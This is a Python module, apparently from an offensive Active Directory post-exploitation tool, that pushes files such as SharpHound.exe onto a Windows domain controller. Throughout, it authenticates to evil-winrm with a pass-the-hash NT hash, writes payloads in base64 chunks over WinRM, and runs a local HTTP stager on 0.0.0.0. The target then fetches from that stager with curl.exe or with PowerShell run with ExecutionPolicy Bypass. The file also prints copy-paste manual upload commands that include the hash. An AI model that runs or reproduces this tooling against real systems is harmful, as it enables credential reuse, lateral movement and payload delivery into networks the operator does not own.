from __future__ import annotations

import base64
import os
import re
import shutil
import subprocess
from pathlib import Path
from typing import Any

from admapper.postex.evil_winrm_output import extract_winrm_command_body
from admapper.support.output import print_error, print_info, print_success, print_warning
from admapper.support.platform import resolve_executable, subprocess_run_kwargs
from admapper.winrm.client import WinRMClient, WinRMError

_DEFAULT_HTTP_PORT = 8765
_WINRM_TIMEOUT = 120
_UPLOAD_TIMEOUT = 180
_UPLOAD_TIMEOUT_MAX = 600
_LARGE_HTTP_THRESHOLD = 400_000


def _parse_length_from_output(output: str) -> int | None:
    """Parse ``Length : 123456`` from PowerShell ``Format-List`` / ``dir`` output."""
    for line in output.splitlines():
        if re.search(r"\bLength\b", line, re.I):
            match = re.search(r"(\d+)\s*$", line.strip())
            if match:
                return int(match.group(1))
    return None


def _winrm_target(client: WinRMClient) -> str:
    if client.dc_ip and client.dc_ip[0].isdigit():
        return client.dc_ip
    host = client._connected_host or client._nthash_target_host()  # noqa: SLF001
    if host and host[0].isdigit():
        return host
    raise WinRMError(
        f"upload needs DC IP (cannot resolve {host!r}) — run: admapper scan --ip-dc <DC_IP>"
    )


def _winrm_user(client: WinRMClient) -> str:
    return f"{client.domain}\\{client.username}"


def _command_body(client: WinRMClient, result) -> str:  # noqa: ANN001
    return ((result.stdout or "") + "\n" + (getattr(client, "last_raw_output", "") or "")).strip()


def _upload_timeout(file_size: int) -> int:
    """Scale evil-winrm upload timeout for large payloads (SMB over WinRM)."""
    extra = max(0, file_size // 50_000)
    return min(_UPLOAD_TIMEOUT_MAX, _UPLOAD_TIMEOUT + extra)


def _quote_evil_winrm_local(path: Path) -> str:
    """Quote local path for evil-winrm ``upload`` when spaces or quotes appear."""
    text = str(path.resolve())
    if " " in text or "'" in text:
        return f"'{text.replace(chr(39), chr(39) * 2)}'"
    return text


def _clean_evil_winrm_output(output: str) -> str:
    """Strip banners/noise so ``dir`` parsing does not false-positive on stderr."""
    return extract_winrm_command_body(output)


def _parse_dir_size(output: str, filename: str) -> int | None:
    """Parse ``dir`` listing size — ignore evil-winrm stderr lines."""
    body = _clean_evil_winrm_output(output)
    name_esc = re.escape(filename)
    for line in body.splitlines():
        stripped = line.strip()
        if not stripped:
            continue
        if re.match(r"^(info|warning|error|evil-winrm)\b", stripped, re.I):
            continue
        match = re.search(rf"(?:^|\s){name_esc}\s+(\d+)\s", line, re.IGNORECASE)
        if match:
            return int(match.group(1))
    return None


def _run_evil_winrm_stdin(
    client: WinRMClient,
    script: str,
    *,
    timeout: int = _UPLOAD_TIMEOUT,
    cwd: Path | None = None,
) -> str:
    ew = resolve_executable(["evil-winrm"])
    if not ew or not client.nthash:
        raise WinRMError("evil-winrm not found (required for PTH upload)")
    target = _winrm_target(client)
    user = _winrm_user(client)
    cmd = [ew, "-i", target, "-u", user, "-H", client.nthash]
    run_cwd = str(cwd.resolve()) if cwd is not None else None
    try:
        proc = subprocess.run(
            cmd,
            input=script,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=run_cwd,
            **subprocess_run_kwargs(),
        )
    except subprocess.TimeoutExpired as exc:
        partial = ""
        if exc.stdout:
            partial = (
                exc.stdout if isinstance(exc.stdout, str) else exc.stdout.decode(errors="replace")
            )
        client.last_raw_output = partial or f"evil-winrm timeout after {timeout}s"
        raise WinRMError("evil-winrm session timeout") from exc
    combined = (proc.stdout or "") + "\n" + (proc.stderr or "")
    client.last_raw_output = combined.strip()
    if proc.returncode != 0 and not combined.strip():
        raise WinRMError(f"evil-winrm exited {proc.returncode}")
    return combined


def _verify_via_evil_winrm_stdin(
    client: WinRMClient,
    remote_path: str,
    *,
    expected_size: int | None = None,
) -> bool:
    """``dir`` over evil-winrm stdin — reliable when nxc stdout is empty."""
    remote_fwd = remote_path.replace("\\", "/")
    script = f"dir {remote_fwd}\nexit\n"
    try:
        output = _run_evil_winrm_stdin(client, script, timeout=_WINRM_TIMEOUT)
    except WinRMError:
        return False
    name = remote_path.rsplit("\\", 1)[-1]
    size = _parse_dir_size(output, name)
    if size is not None and size > 0:
        return expected_size is None or size == expected_size
    return False


def _powershell_remote_file_size(client: WinRMClient, remote_path: str) -> int | None:
    safe = remote_path.replace("'", "''")
    try:
        proc = client.execute(
            f"if(Test-Path -LiteralPath '{safe}'){{(Get-Item -LiteralPath '{safe}').Length}}",
            shell="powershell",
            timeout=60,
        )
        for line in (proc.stdout or "").splitlines():
            token = line.strip()
            if token.isdigit():
                return int(token)
    except WinRMError:
        pass
    return None


def _http_upload_verified(
    client: WinRMClient,
    remote_path: str,
    *,
    expected_size: int,
) -> bool:
    size = _powershell_remote_file_size(client, remote_path)
    if size is not None and size == expected_size:
        return True
    if remote_file_ok(client, remote_path, expected_size=expected_size):
        return True
    status = ""
    try:
        from admapper.postex.monitor_log import remote_file_status

        status = remote_file_status(client, remote_path)
    except Exception:
        pass
    if status and status != "MISSING":
        print_warning(f"upload: HTTP fetched but verify failed — remote: {status}")
    else:
        print_warning("upload: HTTP fetched but remote file missing or size mismatch")
    return False


def remote_file_ok(
    client: WinRMClient,
    remote_path: str,
    *,
    expected_size: int | None = None,
) -> bool:
    """Return True if *remote_path* exists (optionally matching byte size)."""
    if expected_size is not None:
        ps_size = _powershell_remote_file_size(client, remote_path)
        if ps_size is not None and ps_size == expected_size:
            return True

    if client.ticket_method == "nthash" and client.nthash:
        if _verify_via_evil_winrm_stdin(client, remote_path, expected_size=expected_size):
            return True

    safe_cmd = remote_path.replace('"', '\\"')
    listing = client.execute(
        f'dir /-C "{safe_cmd}"',
        shell="cmd",
        timeout=_WINRM_TIMEOUT,
    )
    body = _command_body(client, listing)
    name = remote_path.rsplit("\\", 1)[-1]
    size = _parse_dir_size(body, name)
    if size is not None and size > 0:
        return expected_size is None or size == expected_size

    cmd_check = client.execute(
        f'if exist "{safe_cmd}" (echo ADMAPPER_OK)',
        shell="cmd",
        timeout=_WINRM_TIMEOUT,
    )
    if "ADMAPPER_OK" not in _command_body(client, cmd_check):
        return False
    return expected_size is None


def manual_upload_instructions(
    client: WinRMClient,
    local_path: Path,
    remote_path: str,
    *,
    http_fetch_host: str | None = None,
    http_port: int = _DEFAULT_HTTP_PORT,
) -> str:
    """Copy-paste commands — ``upload`` must run inside interactive evil-winrm."""
    target = _winrm_target(client)
    user = _winrm_user(client)
    nthash = client.nthash or "<hash>"
    local_abs = local_path.resolve()
    remote = remote_path.replace("/", "\\")
    parent = remote.rsplit("\\", 1)[0]
    filename = remote.rsplit("\\", 1)[-1]
    remote_fwd = remote_path.replace("\\", "/")
    lines = [
        "# evil-winrm: upload lands in Documents — copy to absolute path",
        f"cd {local_abs.parent}",
        f"evil-winrm -i {target} -u '{user}' -H {nthash}",
        f"upload {filename}",
        f"Copy-Item -Force .\\{filename} '{remote}'",
        f"Get-Item '{remote}' | Format-List Mode,Length,LastWriteTime",
        "",
    ]
    if http_fetch_host:
        lines.extend(
            [
                "# Alternativa HTTP (target curl — más fiable que certutil)",
                f"cd {local_abs.parent} && python3 -m http.server {http_port}",
                f"curl.exe -fsSL -o {remote} http://{http_fetch_host}:{http_port}/{local_path.name}",
            ]
        )
    return "\n".join(lines)


def _remote_parent_dir(remote_path: str) -> str | None:
    """Parent directory of a Windows remote path (handles ``/`` or ``\\``)."""
    normalized = remote_path.replace("/", "\\")
    if "\\" not in normalized:
        return None
    return normalized.rsplit("\\", 1)[0]


def _ensure_parent_dir(client: WinRMClient, remote_path: str) -> None:
    parent = _remote_parent_dir(remote_path)
    if not parent:
        return
    safe_parent = parent.replace("'", "''")
    client.execute(
        f"New-Item -ItemType Directory -Force -Path '{safe_parent}' | Out-Null",
        shell="powershell",
        timeout=_WINRM_TIMEOUT,
    )


def _upload_base64_chunks(
    client: WinRMClient,
    data: bytes,
    remote_path: str,
) -> bool:
    chunk_size = 2_048 if client.ticket_method == "nthash" else 48_000
    remote_ps = remote_path.replace("'", "''")
    client.execute(
        f"Remove-Item -Force -ErrorAction SilentlyContinue '{remote_ps}'",
        shell="powershell",
        timeout=_WINRM_TIMEOUT,
    )
    offset = 0
    while offset < len(data):
        chunk = data[offset : offset + chunk_size]
        b64 = base64.b64encode(chunk).decode("ascii")
        mode = "CreateNew" if offset == 0 else "Append"
        script = (
            f"$p='{remote_ps}';"
            f"$b=[Convert]::FromBase64String('{b64}');"
            f"$fs=[IO.File]::Open($p,[IO.FileMode]::{mode});"
            f"$fs.Write($b,0,$b.Length);$fs.Close()"
        )
        client.execute(script, shell="powershell", timeout=_WINRM_TIMEOUT)
        offset += len(chunk)
    return remote_file_ok(client, remote_path, expected_size=len(data))


def _upload_via_evil_winrm_builtin(
    client: WinRMClient,
    local_path: Path,
    remote_path: str,
    *,
    expected_size: int,
) -> bool:
    """Built-in ``upload`` over evil-winrm stdin — same as interactive (upload name, then copy)."""
    ew = resolve_executable(["evil-winrm"])
    if not ew or not client.nthash:
        return False

    local_dir = local_path.parent.resolve()
    filename = local_path.name
    parent = remote_path.rsplit("\\", 1)[0].replace("/", "\\")
    remote_bs = remote_path.replace("/", "\\")
    remote_ps = remote_bs.replace("'", "''")
    parent_q = f"'{parent}'" if " " in parent else parent
    timeout = _upload_timeout(expected_size)

    # Interactive pattern: cwd = local dir, ``upload SharpHound.exe``, then Copy-Item.
    # Do NOT pass a remote path to ``upload`` — evil-winrm ignores/mangles it.
    script = "\n".join(
        [
            f"mkdir {parent_q} -Force",
            f"upload {filename}",
            f"Copy-Item -Force .\\{filename} '{remote_ps}'",
            f"Get-Item -LiteralPath '{remote_ps}' | Format-List Length",
            "exit",
        ]
    )
    print_info(
        f"upload: evil-winrm upload+copy → {remote_bs} "
        f"(cwd {local_dir.name}/, timeout {timeout}s)"
    )
    try:
        output = _run_evil_winrm_stdin(
            client, script + "\n", timeout=timeout, cwd=local_dir
        )
    except WinRMError as exc:
        print_warning(f"upload: evil-winrm failed — {exc}")
        return False

    parsed_len = _parse_length_from_output(output)
    if parsed_len is not None and parsed_len == expected_size:
        return True
    ps_len = _powershell_remote_file_size(client, remote_path)
    if ps_len is not None and ps_len == expected_size:
        return True
    return _verify_via_evil_winrm_stdin(client, remote_path, expected_size=expected_size)


class _StagingHTTPRequestHandler:
    """SimpleHTTPRequestHandler that tolerates client disconnects on large files."""

    @staticmethod
    def factory():
        from http.server import SimpleHTTPRequestHandler

        class Handler(SimpleHTTPRequestHandler):
            def log_message(self, format: str, *args: Any) -> None:
                pass

            def copyfile(self, source: Any, outputfile: Any) -> None:
                try:
                    shutil.copyfileobj(source, outputfile, length=64 * 1024)
                except (BrokenPipeError, ConnectionResetError):
                    pass

        return Handler


def _start_http_stager(*, port: int) -> tuple[Any, Any, int]:
    """Bind on 0.0.0.0; try fallback ports when the default is taken."""
    from http.server import ThreadingHTTPServer
    from threading import Thread

    handler = _StagingHTTPRequestHandler.factory()
    last_err: Exception | None = None
    for candidate in (port, 8767, 18765, 9876):
        try:
            server = ThreadingHTTPServer(("0.0.0.0", candidate), handler)
            thread = Thread(target=server.serve_forever, daemon=True)
            thread.start()
            return server, thread, candidate
        except OSError as exc:
            last_err = exc
            continue
    raise OSError(f"could not bind HTTP stager on ports tried from {port}") from last_err


def _stop_http_stager(server: Any, thread: Any) -> None:
    try:
        server.shutdown()
    except Exception:
        pass
    if thread is not None:
        thread.join(timeout=3.0)


def _upload_via_http(
    client: WinRMClient,
    data: bytes,
    remote_path: str,
    *,
    local_path: Path,
    http_fetch_host: str,
    http_port: int = _DEFAULT_HTTP_PORT,
    timeout: int | None = None,
) -> bool:
    """Stage payload via local HTTP server and fetch with curl.exe or Invoke-WebRequest."""
    local_dir = local_path.parent.resolve()
    orig_dir = Path.cwd()
    os.chdir(local_dir)
    server, thread, bound_port = _start_http_stager(port=http_port)
    expected_size = len(data)
    fetch_timeout = timeout if timeout is not None else _upload_timeout(expected_size)
    try:
        _ensure_parent_dir(client, remote_path)
        remote_ps = remote_path.replace("/", "\\").replace("'", "''")
        safe_url = (
            f"http://{http_fetch_host}:{bound_port}/{local_path.name}".replace("'", "''")
        )

        curl_cmd = (
            f'curl.exe -fsSL --retry 3 --retry-delay 2 --max-time {fetch_timeout} '
            f"-o '{remote_ps}' '{safe_url}'"
        )
        iwr_cmd = (
            f"powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "
            f"\"Invoke-WebRequest -Uri '{safe_url}' -OutFile '{remote_ps}' -UseBasicParsing\""
        )
        for label, script in (("curl", curl_cmd), ("iwr", iwr_cmd)):
            try:
                client.execute(script, shell="cmd", timeout=fetch_timeout + 30)
            except WinRMError:
                continue
            verified = _http_upload_verified(client, remote_path, expected_size=expected_size)
            if verified:
                return True
        return False
    finally:
        os.chdir(orig_dir)
        _stop_http_stager(server, thread)


def _try_winrm_transports(
    client: WinRMClient,
    data: bytes,
    remote_path: str,
    *,
    local_path: Path,
    expected_size: int,
) -> str | None:
    """evil-winrm builtin upload, then WinRM base64 chunks as fallback."""
    if client.ticket_method == "nthash" and client.nthash:
        print_info(f"upload: evil-winrm builtin @ {_winrm_target(client)} ({expected_size} bytes)")
        if _upload_via_evil_winrm_builtin(
            client, local_path, remote_path, expected_size=expected_size
        ):
            return "evil_winrm"
        print_info("upload: evil-winrm failed — trying WinRM binary chunks")
        if _upload_base64_chunks(client, data, remote_path):
            return "winrm_chunks"
    elif _upload_base64_chunks(client, data, remote_path):
        return "winrm_chunks"
    return None


def upload_file(
    client: WinRMClient,
    local_path: Path,
    remote_path: str,
    *,
    http_fetch_host: str | None = None,
    http_port: int = _DEFAULT_HTTP_PORT,
) -> str | None:
    """Upload a local file to a remote windows path.

    Returns the transport key that succeeded (e.g. ``evil_winrm``,
    ``winrm_chunks``, ``http``) so callers can decide whether a separate
    can decide whether a separate WinRM verification round is meaningful.
    Raises :class:`WinRMError` if nothing succeeds.
    """
    if not local_path.is_file():
        raise FileNotFoundError(local_path)
    data = local_path.read_bytes()
    expected_size = len(data)
    target = _winrm_target(client)
    _ensure_parent_dir(client, remote_path)
    try:
        from admapper.postex.monitor_log import remediate_remote_zip_path

        remediate_remote_zip_path(client, remote_path)
    except Exception:
        pass

    if (
        expected_size > _LARGE_HTTP_THRESHOLD
        and client.ticket_method == "nthash"
        and client.nthash
    ):
        print_info(
            f"upload: large payload ({expected_size} bytes) — WinRM transports before HTTP"
        )
        transport = _try_winrm_transports(
            client,
            data,
            remote_path,
            local_path=local_path,
            expected_size=expected_size,
        )
        if transport:
            print_success(f"upload OK — {transport} ({expected_size} bytes)")
            return transport

    if http_fetch_host:
        print_info(
            f"upload: HTTP staging @ {http_fetch_host}:{http_port} "
            f"({expected_size} bytes → {remote_path})"
        )
        if _upload_via_http(
            client,
            data,
            remote_path,
            local_path=local_path,
            http_fetch_host=http_fetch_host,
            http_port=http_port,
        ):
            print_success(f"upload OK — HTTP staging ({expected_size} bytes)")
            return "http"
        print_warning("upload: HTTP staging failed — trying WinRM transports")
        try:
            from admapper.postex.monitor_log import remote_file_status

            status = remote_file_status(client, remote_path)
            print_info(f"upload: remote state: {status}")
            if "d----" in status.lower():
                raise WinRMError(
                    "remote ZIP path is a directory — delete it on target, then retry "
                    "(admapper postex logs -w <workspace> to inspect)"
                )
        except WinRMError:
            raise
        except Exception:
            pass

    transport = _try_winrm_transports(
        client,
        data,
        remote_path,
        local_path=local_path,
        expected_size=expected_size,
    )
    if transport:
        print_success(f"upload OK — {transport} ({expected_size} bytes)")
        return transport

    manual = manual_upload_instructions(
        client,
        local_path,
        remote_path,
        http_fetch_host=http_fetch_host,
        http_port=http_port,
    )
    if http_fetch_host:
        print_info("upload: retrying HTTP staging as last resort")
        if _upload_via_http(
            client,
            data,
            remote_path,
            local_path=local_path,
            http_fetch_host=http_fetch_host,
            http_port=http_port,
        ):
            print_success(f"upload OK — HTTP staging ({expected_size} bytes)")
            return "http"
    print_error("automatic upload failed — use interactive evil-winrm (builtin upload):")
    for line in manual.splitlines():
        print_error(f"  {line}")
    raise WinRMError("upload failed — use interactive evil-winrm upload (see above)")


def upload_manual_only_hint(
    client: WinRMClient,
    local_path: Path,
    remote_path: str,
) -> None:
    """Print when auto-upload is skipped by design (e.g. --manual-upload)."""
    manual = manual_upload_instructions(client, local_path, remote_path)
    print_info("upload manual requerido — evil-winrm interactivo:")
    for line in manual.splitlines():
        print_info(f"  {line}")
